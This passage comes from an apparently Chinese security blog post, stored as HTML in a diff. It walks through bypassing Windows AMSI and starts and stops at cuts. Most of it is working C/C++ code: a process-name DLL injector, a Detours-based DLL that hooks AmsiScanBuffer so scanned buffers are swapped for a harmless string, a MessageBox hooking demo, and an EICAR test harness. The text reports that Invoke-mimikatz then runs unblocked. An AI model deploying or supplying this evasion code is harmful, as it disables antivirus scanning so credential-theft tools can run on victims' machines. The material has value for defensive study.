+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (Process32Next(hSnap, &amp;procEntry));
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> main(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span>** argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span>* processName = argv[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>* dllName = argv[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    DWORD procID = GetProcIDByName(processName);
+</span></span><span style="display:flex;"><span>    std::cout &lt;&lt; <span style="color:#e6db74">&#34;[+] Got process ID for &#34;</span> &lt;&lt; processName &lt;&lt; <span style="color:#e6db74">&#34; PID: &#34;</span> &lt;&lt; procID &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (InjectDll(procID, dllName)) {
+</span></span><span style="display:flex;"><span>        std::cout &lt;&lt; <span style="color:#e6db74">&#34;DLL now injected!&#34;</span> &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        std::cout &lt;&lt; <span style="color:#e6db74">&#34;DLL couldn&#39;t be injected&#34;</span> &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>那么DLL注入已经实现了，接下来就是注入特定进程，根据之前的研究结果，就来创建一个DLL和特定函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;Windows.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;detours.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;amsi.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;iostream&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma</span> comment(lib, <span style="color:#e6db74">&#34;amsi.lib&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define</span> SAFE <span style="color:#e6db74">&#34;SafeString&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext,
+</span></span><span style="display:flex;"><span>    PVOID buffer, ULONG length,
+</span></span><span style="display:flex;"><span>    LPCWSTR contentName,
+</span></span><span style="display:flex;"><span>    HAMSISESSION amsiSession,
+</span></span><span style="display:flex;"><span>    AMSI_RESULT* result) = AmsiScanBuffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Our user controlled AmsiScanBuffer</span>
+</span></span><span style="display:flex;"><span>__declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
+</span></span><span style="display:flex;"><span>    PVOID buffer, ULONG length,
+</span></span><span style="display:flex;"><span>    LPCWSTR contentName,
+</span></span><span style="display:flex;"><span>    HAMSISESSION amsiSession,
+</span></span><span style="display:flex;"><span>    AMSI_RESULT* result) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std::cout &lt;&lt; <span style="color:#e6db74">&#34;[+] AmsiScanBuffer called&#34;</span> &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    std::cout &lt;&lt; <span style="color:#e6db74">&#34;[+] Buffer &#34;</span> &lt;&lt; buffer &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    std::cout &lt;&lt; <span style="color:#e6db74">&#34;[+] Buffer Length &#34;</span> &lt;&lt; length &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL APIENTRY DllMain(HMODULE hModule,
+</span></span><span style="display:flex;"><span>    DWORD  dwReason,
+</span></span><span style="display:flex;"><span>    LPVOID lpReserved
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (DetourIsHelperProcess()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dwReason == DLL_PROCESS_ATTACH) {
+</span></span><span style="display:flex;"><span>        AllocConsole();
+</span></span><span style="display:flex;"><span>        freopen_s((FILE**)stdout, <span style="color:#e6db74">&#34;CONOUT$&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>, stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        DetourRestoreAfterWith();
+</span></span><span style="display:flex;"><span>        DetourTransactionBegin();
+</span></span><span style="display:flex;"><span>        DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        DetourAttach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);
+</span></span><span style="display:flex;"><span>        DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (dwReason == DLL_PROCESS_DETACH) {
+</span></span><span style="display:flex;"><span>        DetourTransactionBegin();
+</span></span><span style="display:flex;"><span>        DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>        DetourDetach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);
+</span></span><span style="display:flex;"><span>        DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>        FreeConsole();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果环境允许的话可以进行调试，调试过程中可以看到AMSI的作用方式，主要是观察AmsiScanBuffer的前几条指令。</p>
+<p><img src="../amsi/14.png" alt="img"></p>
+<p>在注入后我们可以看到跳转指令，在我们进行注入修改后继续单步执行就会跳到我们构造好的AmsiScanBuffer</p>
+<p><img src="../amsi/15.png" alt="img"></p>
+<p>注入成功后再来执行Invoke-mimikatz就不会被拦截了，效果如下：</p>
+<p><img src="../amsi/16.png" alt="img"></p>
+<h3 id="hook函数">HOOK函数</h3>
+<p>既然没有保护可以直接进行劫持，那同样地也可以尝试通过HOOK的方式进行绕过。</p>
+<p>HOOK函数可以让我们在调用这个函数之前控制这个函数，作为攻击者我们能做的事情很多，比如记录参数日志、允许或者拦截函数的执行、覆盖传入这个函数的参数、修改函数的返回值，我们现在需要找到hook AMSI检测函数即AmsiScanBuffer函数的方法，这里可使用微软提供的hook函数库detours。</p>
+<p>关于Detours Hook库的详细使用可以参考CSDN上的<a href="https://blog.csdn.net/qing666888/article/details/81540683">一篇文章</a></p>
+<p>以下代码为某大佬写的demo，用于演示Detours库如何Hook MessageBox函数并且覆盖用户参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;detours.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#a6e22e">int</span>(WINAPI<span style="color:#f92672">*</span> OriginalMessageBox)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) <span style="color:#f92672">=</span> MessageBox;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">_MessageBox</span>(HWND hWnd, LPCSTR lpText, LPCTSTR lpCaption, UINT uType) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> OriginalMessageBox(NULL, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;We&#39;ve used detours to hook MessageBox&#34;</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Hooked Window&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Hooking MessageBox&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    DetourRestoreAfterWith();
+</span></span><span style="display:flex;"><span>    DetourTransactionBegin();
+</span></span><span style="display:flex;"><span>    DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>    DetourAttach(<span style="color:#f92672">&amp;</span>(PVOID<span style="color:#f92672">&amp;</span>)OriginalMessageBox, _MessageBox);
+</span></span><span style="display:flex;"><span>    DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Message Box Hooked&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    MessageBox(NULL, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;My Message&#34;</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;My Caption&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Unhooking MessageBox&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>    DetourDetach(<span style="color:#f92672">&amp;</span>(PVOID<span style="color:#f92672">&amp;</span>)OriginalMessageBox, _MessageBox);
+</span></span><span style="display:flex;"><span>    DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Message Box Unhooked&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>有了这部分基础就可以进行编写，通过Hook AMSIScanBuffer来达到绕过验证的目的。可以使用的payload参考EICAR进行实现，以下为EICAR简介和测试代码。</p>
+<p><strong>EICAR标准反病毒测试文件</strong>，又称<strong>EICAR测试文件</strong>, 是由<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%B4%B2%E5%8F%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E5%8D%8F%E4%BC%9A">欧洲反计算机病毒协会</a>（EICAR）与<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6%E7%BB%84%E7%BB%87&amp;action=edit&amp;redlink=1">计算机病毒研究组织</a>（CARO）研制的文件, 用以测试<a href="https://zh.wikipedia.org/wiki/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6">杀毒软件</a>的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;amsi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;system_error&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;amsi.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define EICAR &#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">GetResultDescription</span>(HRESULT hRes) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> description;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (hRes)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_CLEAN:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_CLEAN&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_NOT_DETECTED:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_NOT_DETECTED&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_START:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_BLOCKED_BY_ADMIN_START&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_END:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_BLOCKED_BY_ADMIN_END&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_DETECTED:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_DETECTED&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> description; 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    HAMSICONTEXT amsiContext;
+</span></span><span style="display:flex;"><span>    HRESULT hResult <span style="color:#f92672">=</span> S_OK;
+</span></span><span style="display:flex;"><span>    AMSI_RESULT res <span style="color:#f92672">=</span> AMSI_RESULT_CLEAN;
+</span></span><span style="display:flex;"><span>    HAMSISESSION hSession <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    LPCWSTR fname <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;EICAR&#34;</span>;
+</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> sample <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)EICAR;
+</span></span><span style="display:flex;"><span>    ULONG size <span style="color:#f92672">=</span> strlen(EICAR);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    ZeroMemory(<span style="color:#f92672">&amp;</span>amsiContext, <span style="color:#66d9ef">sizeof</span>(amsiContext));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiInitialize(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;AmsiHook&#34;</span>, <span style="color:#f92672">&amp;</span>amsiContext);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiInitialize Failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiOpenSession(amsiContext, <span style="color:#f92672">&amp;</span>hSession);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiOpenSession Failed&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hResult <span style="color:#f92672">=</span> AmsiScanBuffer(amsiContext, sample, size, fname, hSession, <span style="color:#f92672">&amp;</span>res);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hResult <span style="color:#f92672">!=</span> S_OK) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>system_category().message(hResult) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[-] AmsiScanBuffer Failed &#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hResult;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Anything above 32767 is considered malicious
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> GetResultDescription(res) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>以下为EICAR的输入和运行脚本的输出截图：<img src="../amsi/17.png" alt="img"></p>
+<p>有了测试AmsiScanBuffer的基础代码，我们使用刚才在hook messagebox中使用的方法来hook AmsiScanBuffer</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;amsi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;detours.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;system_error&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;amsi.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define EICAR &#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SAFE &#34;SafeString&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Converts number given out by AmsiScanBuffer into a readable string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">GetResultDescription</span>(HRESULT hRes) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> description;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (hRes)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_CLEAN:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_CLEAN&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_NOT_DETECTED:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_NOT_DETECTED&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_START:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_BLOCKED_BY_ADMIN_START&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_END:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_BLOCKED_BY_ADMIN_END&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> AMSI_RESULT_DETECTED:
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMSI_RESULT_DETECTED&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> description; 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Store orignal version of AmsiScanBuffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#a6e22e">HRESULT</span>(WINAPI<span style="color:#f92672">*</span> OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext, 
+</span></span><span style="display:flex;"><span>                                                PVOID buffer, ULONG length, 
+</span></span><span style="display:flex;"><span>                                                LPCWSTR contentName, 
+</span></span><span style="display:flex;"><span>                                                HAMSISESSION amsiSession, 
+</span></span><span style="display:flex;"><span>                                                AMSI_RESULT<span style="color:#f92672">*</span> result) <span style="color:#f92672">=</span> AmsiScanBuffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Our user controlled AmsiScanBuffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>HRESULT <span style="color:#a6e22e">_AmsiScanBuffer</span>(HAMSICONTEXT amsiContext,
+</span></span><span style="display:flex;"><span>    PVOID buffer, ULONG length,
+</span></span><span style="display:flex;"><span>    LPCWSTR contentName,
+</span></span><span style="display:flex;"><span>    HAMSISESSION amsiSession,
+</span></span><span style="display:flex;"><span>    AMSI_RESULT<span style="color:#f92672">*</span> result) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> OriginalAmsiScanBuffer(amsiContext, (BYTE<span style="color:#f92672">*</span>)SAFE, length, contentName, amsiSession, result);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Sets up detours to hook our function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HookAmsi</span>() {
+</span></span><span style="display:flex;"><span>    DetourRestoreAfterWith();
+</span></span><span style="display:flex;"><span>    DetourTransactionBegin();
+</span></span><span style="display:flex;"><span>    DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>    DetourAttach(<span style="color:#f92672">&amp;</span>(PVOID<span style="color:#f92672">&amp;</span>)OriginalAmsiScanBuffer, _AmsiScanBuffer);
+</span></span><span style="display:flex;"><span>    DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Undoes the hooking we setup earlier
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UnhookAmsi</span>() {
+</span></span><span style="display:flex;"><span>    DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>    DetourDetach(<span style="color:#f92672">&amp;</span>(PVOID<span style="color:#f92672">&amp;</span>)OriginalAmsiScanBuffer, _AmsiScanBuffer);
+</span></span><span style="display:flex;"><span>    DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Declares variables required for AmsiInitialize, AmsiOpenSession, and AmsiScanBuffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HAMSICONTEXT amsiContext;
+</span></span><span style="display:flex;"><span>    HRESULT hResult <span style="color:#f92672">=</span> S_OK;
+</span></span><span style="display:flex;"><span>    AMSI_RESULT res <span style="color:#f92672">=</span> AMSI_RESULT_CLEAN;
+</span></span><span style="display:flex;"><span>    HAMSISESSION hSession <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+</span></span><span style="display:flex;"><span>
